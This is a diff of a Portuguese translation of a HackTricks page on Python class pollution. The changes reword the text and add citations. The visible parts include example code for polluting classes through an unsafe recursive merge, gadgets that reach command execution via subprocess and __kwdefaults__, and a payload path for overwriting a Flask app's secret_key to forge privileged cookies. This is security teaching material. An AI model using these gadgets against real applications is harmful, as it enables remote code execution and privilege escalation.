@@ -1,10 +1,10 @@
-# Poluição de Classe (Poluição de Protótipo do Python)
+# Class Pollution (Prototype Pollution do Python)
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Exemplo Básico
+## Exemplo básico
 
-Verifique como é possível poluir classes de objetos com strings:
+Veja como é possível poluir classes de objetos com strings:<sup>[[1]](#references)</sup>
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -28,7 +28,7 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
-## Exemplo Básico de Vulnerabilidade
+## Exemplo básico de vulnerabilidade
 ```python
 # Initial state
 class Employee: pass
@@ -61,11 +61,11 @@ USER_INPUT = {
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-## Exemplos de Gadget
+## Exemplos de gadgets
 
 <details>
 
-<summary>Criando valor padrão de propriedade de classe para RCE (subprocess)</summary>
+<summary>Criando valor padrão de propriedade de classe para RCE (subprocess)</summary><sup>[[1]](#references)</sup>
 ```python
 from os import popen
 class Employee: pass # Creating an empty class
@@ -116,7 +116,7 @@ print(system_admin_emp.execute_command())
 
 <details>
 
-<summary>Poluindo outras classes e variáveis globais através de <code>globals</code></summary>
+<summary>Poluindo outras classes e variáveis globais por meio de <code>globals</code></summary><sup>[[1]](#references)</sup>
 ```python
 def merge(src, dst):
 # Recursive merge function
@@ -148,7 +148,7 @@ print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 
 <details>
 
-<summary>Execução arbitrária de subprocessos</summary>
+<summary>Execução arbitrária de subprocessos</summary><sup>[[1]](#references)</sup>
 ```python
 import subprocess, json
 
@@ -180,9 +180,9 @@ subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
 
 <details>
 
-<summary>Substituindo <strong><code>__kwdefaults__</code></strong></summary>
+<summary>Sobrescrevendo <strong><code>__kwdefaults__</code></strong></summary>
 
-**`__kwdefaults__`** é um atributo especial de todas as funções, baseado na [documentação](https://docs.python.org/3/library/inspect.html) do Python, é um “mapeamento de quaisquer valores padrão para parâmetros **somente de palavra-chave**”. Poluir este atributo nos permite controlar os valores padrão dos parâmetros somente de palavra-chave de uma função, que são os parâmetros da função que vêm após \* ou \*args.
+**`__kwdefaults__`** é um atributo especial de todas as funções. De acordo com a [documentação](https://docs.python.org/3/library/inspect.html) do Python, ele é um “mapeamento de quaisquer valores padrão para parâmetros **keyword-only**”. Poluir esse atributo nos permite controlar os valores padrão dos parâmetros **keyword-only** de uma função, que são os parâmetros da função que vêm depois de \* ou \*args.<sup>[[1]](#references)</sup>
 ```python
 from os import system
 import json
@@ -223,25 +223,25 @@ execute() #> Executing echo Polluted
 
 <details>
 
-<summary>Substituindo o segredo do Flask em arquivos</summary>
+<summary>Substituindo o secret do Flask entre arquivos</summary>
 
-Então, se você puder fazer uma poluição de classe sobre um objeto definido no arquivo python principal da web, mas **cuja classe está definida em um arquivo diferente** do principal. Porque, para acessar \_\_globals\_\_ nos payloads anteriores, você precisa acessar a classe do objeto ou métodos da classe, você poderá **acessar os globals naquele arquivo, mas não no principal**. \
-Portanto, você **não poderá acessar o objeto global do app Flask** que definiu a **chave secreta** na página principal:
+Então, se você puder fazer uma class pollution em um objeto definido no arquivo Python principal da aplicação web, mas **cuja classe está definida em um arquivo diferente** do arquivo principal. Como, para acessar \_\_globals\_\_ nos payloads anteriores, você precisa acessar a classe do objeto ou os métodos da classe, será possível **acessar os globals nesse arquivo, mas não no arquivo principal**. \
+Portanto, você **não poderá acessar o objeto global app do Flask** que definiu a **secret key** na página principal:<sup>[[1]](#references)</sup>
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
-Neste cenário, você precisa de um gadget para percorrer arquivos até chegar ao principal para **acessar o objeto global `app.secret_key`** para mudar a chave secreta do Flask e poder [**escalar privilégios** conhecendo essa chave](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
+Neste cenário, você precisa de um gadget para percorrer os arquivos até chegar ao arquivo principal e **acessar o objeto global `app.secret_key`**, alterar a secret key do Flask e conseguir [**escalar privilégios** conhecendo essa key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
 
-Um payload como este [deste writeup](https://ctftime.org/writeup/36082):
+Um payload como este [deste writeup](https://ctftime.org/writeup/36082):<sup>[[2]](#references)</sup>
 ```python
 __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
 ```
-Use este payload para **mudar `app.secret_key`** (o nome em seu aplicativo pode ser diferente) para poder assinar novos e mais privilegiados cookies do flask.
+Use este payload para **alterar `app.secret_key`** (o nome no seu app pode ser diferente) para poder assinar cookies do Flask novos e com mais privilégios.
 
 </details>
 
-Verifique também a seguinte página para mais gadgets somente leitura:
+Confira também a página a seguir para obter mais gadgets somente de leitura:
 
 {{#ref}}
 python-internal-read-gadgets.md
@@ -249,6 +249,7 @@ python-internal-read-gadgets.md
 
 ## Referências
 
-- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
+- [1] [Prototype Pollution in Python](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
+- [2] [CTFtime - idekCTF 2022: task manager writeup](https://ctftime.org/writeup/36082)
 
 {{#include ../../banners/hacktricks-training.md}}
